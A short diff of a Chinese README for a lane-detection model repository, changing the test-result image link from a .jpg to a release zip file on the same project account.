@@ -15,7 +15,7 @@ LaneDet_horizon：地平线模型、测试（量化）图像、测试结果、�
 
 # 测试结果
 
-![image](https://github.com/cqu20160901/UltraFastLaneDetection_caffe_onnx_horizon_rknn/blob/main/LaneDet_caffe/test_result_caffe.jpg)
+![image](https://github.com/cqu20160901/Ultra-Fast-Lane-Detection_caffe_onnx_horizon_rknn/releases/download/v1.0.0/UltraFastLaneDetection.zip)
 
 # 参考链接
 https://github.com/cfzd/Ultra-Fast-Lane-Detection
